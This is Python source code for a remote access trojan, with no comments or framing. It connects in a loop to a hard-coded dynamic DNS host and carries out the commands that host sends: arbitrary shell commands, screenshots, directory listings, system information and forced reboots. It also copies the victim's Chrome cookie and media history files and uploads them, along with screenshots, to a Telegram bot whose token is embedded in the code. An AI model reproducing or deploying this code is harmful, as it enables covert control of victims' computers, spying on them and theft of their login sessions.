import socket
import sys
import subprocess
import requests
import os
from PIL import ImageGrab
host = 'dimagamera.ddns.net'
port = 81

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		data = "Connected"
		a = s.recv(1024)
		a = a.decode()
		if a == '/cmd':
			cmd = s.recv(1024)
			cmd = cmd.decode()
			cmd_process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
			cmd_process = cmd_process.stdout + cmd_process.stderr
			s.send(cmd_process)

		elif a == '/screen':
			try:
				img = ImageGrab.grab()
				img.save("screenshot.png")
				photo = open(r"screenshot.png", 'rb')
				files = {'document': photo}
				requests.post("https://api.telegram.org/bot1334401569:AAF72wWqcQjpCY7o-BcfKfV420tBcqnXM0g/sendDocument?chat_id=330710135", files=files)
				photo.close()
				os.remove('screenshot.png')
			except:
				pass

		elif a == '/mkdir':
			dir = s.recv(1024)
			dir = dir.decode()
			os.system('mkdir '+ str(dir))

		elif a == "/dir":
			num = s.recv(1024)
			num = num.decode()
			if num == '1':
				c = s.recv(1024)
				c = c.decode()
				if c == '1':
					d = os.listdir()
					f = open('files.txt', 'w')
					for item in d:
						f.write(item+'\n')
					f.close()
					f = open('files.txt','rb')
					while True:
						a = f.read(1024)
						if not a:
							break
						s.send(a)
					f.close()
					os.remove('files.txt')

				elif c == '2':
					pwd = os.getcwd()
					f = open('pwd.txt', 'w')
					f.write(pwd)
					f.close()
					f = open('pwd.txt','rb')
					a = f.read(1024)
					s.send(a)
					f.close()
					s.send(a)
					d = s.recv(1024)
					d= d.decode()
					desktop = os.listdir('C:\\Users\\gamer\\')
					print(desktop)
					d = os.listdir(d)
					print('a')
					f = open('files.txt', 'w')
					for item in d:
						f.write(item+'\n')
					f.close()
					f = open('files.txt','rb')
					while True:
						a = f.read(1024)
						if not a:
							break
						s.send(a)
					f.close()
					os.remove('files.txt')					

		elif a == "/sysinfo":
			cmd_process = subprocess.run('systeminfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
			cmd_process = cmd_process.stdout + cmd_process.stderr
			s.send(cmd_process)

		elif a == "/poff":
			os.system('shutdown /r /f /t 0')
		
		elif a == "/cks":
			login = os.getlogin()
			cookie = "C:\\Users\\"+login+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
			MediaHistory = "C:\\Users\\"+login+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Media History"
			f = open(cookie, 'rb')
			files = {'document': f}
			requests.post("https://api.telegram.org/bot1334401569:AAF72wWqcQjpCY7o-BcfKfV420tBcqnXM0g/sendDocument?chat_id=330710135", files=files)
			f.close()
			f = open(MediaHistory, 'rb')
			files = {'document': f}
			requests.post("https://api.telegram.org/bot1334401569:AAF72wWqcQjpCY7o-BcfKfV420tBcqnXM0g/sendDocument?chat_id=330710135", files=files)
			f.close()

	except:
		pass
